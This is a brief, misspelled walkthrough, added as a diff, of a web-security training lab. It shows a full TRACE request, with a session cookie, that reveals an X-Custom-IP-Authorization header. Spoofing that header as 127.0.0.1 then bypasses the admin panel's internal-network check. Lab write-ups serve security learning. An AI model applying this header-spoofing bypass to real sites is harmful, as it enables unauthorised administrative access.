@@ -1,0 +1,20 @@
+Via Directory bruteforce
+https://0a7600cd03aec70b812ede8600b1004e.web-security-academy.net/admin/
+with message says that you can't access admin page unless you are in the internal netwrok
+by intertsepting the reqest and change the method to TRACE
+TRACE /admin HTTP/2
+Host: 0a8a008b03c195e4892b1fbc00050053.web-security-academy.net
+Cookie: session=0avYOVvbvv74lqrPexGGzNOUmlLEUOK2
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: none
+Sec-Fetch-User: ?1
+Te: trailers
+in the response we found coustm header to identify the user IP (Information Disclosure)
+X-Custom-IP-Authorization: 127.0.0.1
+then you access the admin panel and delete Carlos!!
